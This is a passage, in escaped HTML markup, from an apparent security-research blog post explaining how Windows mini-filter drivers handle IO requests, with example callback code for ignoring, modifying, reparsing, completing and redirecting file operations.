class="c1"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c62" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;Disallow FastIO file creation.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c55" id="h.yo7abx97tose"&gt;&lt;span class="c14"&gt;Handling IO Requests&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span&gt;Now that we&amp;rsquo;ve described registration of the mini-filter and its callbacks let&amp;#39;s go through a few examples of how IO requests are handled inside the pre and post operation callbacks. We&amp;rsquo;ll use the six operations I mentioned earlier as a base for this discussion. Any examples are to demonstrate the likely code you&amp;rsquo;ll find in a driver but omits security checks and other unimportant details. &lt;/span&gt;&lt;span&gt;This isn&amp;rsquo;t Stack Overflow, so please don&amp;rsquo;t copy and paste them into real drivers.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.nd4qjwvf1f"&gt;&lt;span class="c5"&gt;Pass the IO request unmodified&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The simplest way of not modifying an IO request is to not specify a pre-operation callback. Of course we&amp;rsquo;re assuming the driver wants to handle an IO request selectively based on certain criteria so it must implement the callback. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The easiest way to ignore the IO request is to return the &lt;/span&gt;&lt;span class="c21"&gt;FLT_PREOP_SUCCESS_NO_CALLBACK&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;status code from the pre-operation callback. That indicates to the filter manager that the mini-filter has completed its processing and is no longer interested in the IO request.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;To give an example the following pre-create operation callback will ignore any open requests where the desired access does not request the &lt;/span&gt;&lt;span class="c21"&gt;FILE_WRITE_DATA&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;access right. If the request doesn&amp;rsquo;t contain the access then the request is completed with no callback.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b910f4dca3da3ba25f4d3b7b14e184b4501ecf5d"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c30 c4"&gt;FLT_PREOP_CALLBACK_STATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;PreCreateOperation&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PCFLT_RELATED_OBJECTS FltObjects&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PVOID&lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c4 c30"&gt;&amp;nbsp;CompletionContext&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_IO_PARAMETER_BLOCK ps &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Iopb&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Parameters&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; DWORD access &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;ps&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Create&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;SecurityContext&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;DesiredAccess&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;if&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;((&lt;/span&gt;&lt;span class="c4"&gt;access &lt;/span&gt;&lt;span class="c9"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FILE_WRITE_DATA&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;==&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_SUCCESS_NO_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c19 c8"&gt;&lt;span class="c30 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c4 c40 c80"&gt;// Perform some operation...&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The example extracts the desired access from the creation parameters. If the FILE_WRITE_DATA access right is not set then the filter driver will ignore the IO request entirely by returning the no callback status code.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;Of course depending on the purpose of the filter driver it might still want the post-operation callback to be called. For example if the filter driver is monitoring file access then the post-operation callback will contain valuable information such as the success or failure of opening the file or the data read from the file. In this case it makes sense to return &lt;/span&gt;&lt;span class="c21"&gt;FLT_PREOP_SUCCESS_WITH_CALLBACK&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;When the driver specified it wants a post-operation callback it can configure the &lt;/span&gt;&lt;span class="c21"&gt;CompletionContext&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;with any value it likes. This context can then be used in the post-operation callback. This can be used to pass additional data between the callbacks so that it can perform its operation correctly.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.dl4q78rczjd4"&gt;&lt;span class="c5"&gt;Modify the IO request&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;During a pre-operation callback the driver can modify the contents of the &lt;/span&gt;&lt;span class="c21"&gt;FLT_CALLBACK_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure. For example the driver could change the security context used to open the file or it could even change the name of the file itself. The driver must indicate to the filter manager that the data has been modified by setting the &lt;/span&gt;&lt;span class="c21"&gt;FLTFL_CALLBACK_DATA_DIRTY&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag in the &lt;/span&gt;&lt;span class="c21"&gt;Flags&lt;/span&gt;&lt;span&gt;&amp;nbsp;field before returning. The correct way of setting the flag is to call the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltsetcallbackdatadirty"&gt;FltSetCallbackDataDirty&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;API however all that currently does is set the flag.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.ry5ns1lqqp2e"&gt;&lt;span class="c5"&gt;Modify the IO request response&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;As with the request you can modify the response in the post-operation callback which will return the changes to higher mini-filters and the IO manager. One trick I&amp;rsquo;ve commonly seen is to use this to change the target file by modifying the file name and returning the status code &lt;/span&gt;&lt;span class="c21"&gt;STATUS_REPARSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;as if the file system hand encountered a symbolic link.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The following is the basic approach that the &lt;/span&gt;&lt;span class="c21"&gt;LUAFV &lt;/span&gt;&lt;span class="c1"&gt;driver uses to perform the reparse operation to an arbitrary file path in a post-operation callback.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5bf6b5d4c63ae4ea06b33a6b530bb842ffc7af1d"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;FLT_POSTOP_CALLBACK_STATUS LuafvReparse&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PUNICODE_STRING TargetFileName&lt;/span&gt;&lt;span class="c9"&gt;){&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; LuafvSetEcp&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;TargetFileName&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; PFILE_OBJECT FileObject &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Iopb&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;TargetFileObject&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; ExFreePool&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;FileObject&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileName&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Buffer&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; FileObject&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileName&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Buffer &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;ExAllocatePool&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;PagedPool&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; TargetFileName&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Length&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; FileObject&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileName&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;MaximumLength &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;TargetFileName&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Length&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; RtlCopyUnicodeString&lt;/span&gt;&lt;span class="c9"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="c4"&gt;FileObject&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileName&lt;/span&gt;&lt;span class="c9"&gt;,&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;TargetFileName&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;IoStatus&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Information &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4 c36"&gt;0&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;IoStatus&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;span class="c4"&gt;Status &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;STATUS_REPARSE&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; FltSetCallbackDataDirty&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c32 c23"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_POSTOP_FINISHED_PROCESSING&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The code deallocates the filename buffer in the target file object and replaces it with its own. It then sets the status code to &lt;/span&gt;&lt;span class="c21"&gt;STATUS_REPARSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;and indicates that processing has finished. In Windows 7 a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ioreplacefileobjectname"&gt;IoReplaceFileObjectName&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API was introduced which makes this operation much less error prone, however LUAFV was written for Vista where the API didn&amp;rsquo;t exist so it had to make do. An official Microsoft example can be found in the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://github.com/microsoft/Windows-driver-samples/blob/master/filesys/miniFilter/simrep/simrep.c"&gt;SimRep sample driver&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;One quirk of this operation is the &lt;/span&gt;&lt;span class="c21"&gt;FileName&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the file object is volume relative, e.g. if you opened &lt;/span&gt;&lt;span class="c21"&gt;c:\windows\notepad.exe&lt;/span&gt;&lt;span&gt;&amp;nbsp;then &lt;/span&gt;&lt;span class="c21"&gt;FileName &lt;/span&gt;&lt;span&gt;is set to &lt;/span&gt;&lt;span class="c21"&gt;\windows\notepad.exe&lt;/span&gt;&lt;span&gt;. However, you can replace that with an absolute path such as &lt;/span&gt;&lt;span class="c21"&gt;\??\d:\abc.txt&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;and that still works. Also the driver doesn&amp;rsquo;t need to create a real mount point or symbolic link reparse point buffer for this to work. The IO manager will just take the path from the file object and restart the create request with the new path.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.jxnbxukjqp77"&gt;&lt;span class="c5"&gt;Complete the IO request with a success result&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span&gt;The driver can immediately complete an IO request by returning&lt;/span&gt;&lt;span class="c21"&gt;&amp;nbsp;FLT_PREOP_COMPLETE&lt;/span&gt;&lt;span&gt;&amp;nbsp;from a pre-operation callback and updating the &lt;/span&gt;&lt;span class="c21"&gt;IO_STATUS_BLOCK&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_CALLBACK_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;parameter. The previous reparse example shows how that update works. If you&amp;rsquo;re only updating the &lt;/span&gt;&lt;span class="c21"&gt;IO_STATUS_BLOCK&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;you don&amp;rsquo;t need to mark the data as dirty.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;Higher level filter drivers will still get their post-operation callbacks invoked if they&amp;rsquo;re registered for them, however no lower altitude drivers will be called with the IO request.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.nzniy7tr7tkz"&gt;&lt;span class="c5"&gt;Complete the IO request with an error result.&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;This is basically the same as for a success code, just specifying a different NT status. There&amp;rsquo;s nothing stopping a higher level filter driver from ignoring the error code and replacing it with a success. &lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.a0vcy6kng4t0"&gt;&lt;span class="c5"&gt;Pass the IO request to a different file or device stack&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The filter driver can redirect the operation to another device stack. For example you could implement a driver which redirects file reads and writes to a completely different file on the disk, making it look like the user is modifying the file when they&amp;rsquo;re not.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The most obvious way of achieving this would be to open the new file during the pre-create operation then use that file object as the target for all subsequent operations. There are two potential issues with this approach.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;First, how can a filter driver interact with a file system volume it&amp;rsquo;s attached to without resulting in an infinite loop? For example, if the driver wants to open a file it can call &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatefile"&gt;IoCreateFile&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;(and variants). However, the IO manager would dispatch the IO request to the top of the device stack, which would get back to the filter manager which could end up calling the filter driver again, ad infinitum. The same would be the case with any exported APIs from the kernel.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;This issue is solved through two mechanisms. The first is the filter manager exposes a set of APIs which mirror the kernel IO APIs but will only dispatch the IO request to filters below the caller. For example you can call &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltcreatefileex"&gt;FltCreateFileEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltwritefile"&gt;FltWriteFile&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;and be sure you won&amp;rsquo;t end up in a loop. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;For file creation requests the driver can also employ a second mechanism called &lt;/span&gt;&lt;span class="c21"&gt;Extra Create Parameters (ECP)&lt;/span&gt;&lt;span&gt;. An ECP is a GUID along with additional data which can be attached to the create request using the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltinsertextracreateparameter"&gt;FltInsertExtraCreateParameter&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. The filter driver can attach the ECP to the request, then check for its presence using &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltfindextracreateparameter"&gt;FltFindExtraCreateParameter&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API, allowing it to ignore the request. For example the earlier code which shows how LUAFV implements a reparse operation shows calling &lt;/span&gt;&lt;span class="c21"&gt;LuafvSetEcp&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;which sets an ECP on the request so that the new create request can be ignored by the driver.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The second issue is how do you actually pass on the parameters for the IO request to the new file you&amp;rsquo;ve opened? The naive approach would be to extract the parameters then invoke the corresponding filter manager API. For example, for a write IO request, read out the buffer and length then call FltWriteFile. This is error prone and might introduce subtle security issues.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;A better approach is the driver can change the &lt;/span&gt;&lt;span class="c21"&gt;TargetFileObject &lt;/span&gt;&lt;span&gt;field in the pre-operation callback&amp;rsquo;s &lt;/span&gt;&lt;span class="c21"&gt;FLT_IO_PARAMETER_BLOCK&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure then return a success code for the IO request to continue. This will cause the filter manager to send the original IO request to the new file object. The following is a simple example which could be in a pre-operation callback which will redirect the request to a file object extracted from the file system context:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2b78c3fa992590409e0365f91f3b3056b9daaa92"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;PREDIRECT_CONTEXT context &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4 c74"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c74 c23 c84"&gt;// Get driver&amp;rsquo;s allocated context.&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c32 c23"&gt;if&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;context&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileObject&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; Data&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;Iopb&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;TargetFileObject &lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;context&lt;/span&gt;&lt;span class="c9"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c4"&gt;FileObject&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; FltSetCallbackDataDirty&lt;/span&gt;&lt;span class="c9"&gt;(&lt;/span&gt;&lt;span class="c4"&gt;Data&lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23 c32"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_PREOP_SUCCESS_NO_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c19"&gt;&lt;span class="c9"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c55" id="h.1neovsml50sj"&gt;&lt;span class="c14"&gt;Mini-Filter Communication&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;For there to be a security vulnerability the driver must process some untrustworthy data from a malicious user. What makes mini-filter drivers interesting is there&amp;#39;s multiple places where untrusted data can be processed. Let&amp;rsquo;s go through the ways of identifying and analyzing these communication channels.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.sq7pvxyffy0f"&gt;&lt;span class="c5"&gt;Device Object&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;A mini-filter doesn&amp;rsquo;t need to create any device object to perform its function, the filter manager deals with creating any necessary device objects. That doesn&amp;rsquo;t mean 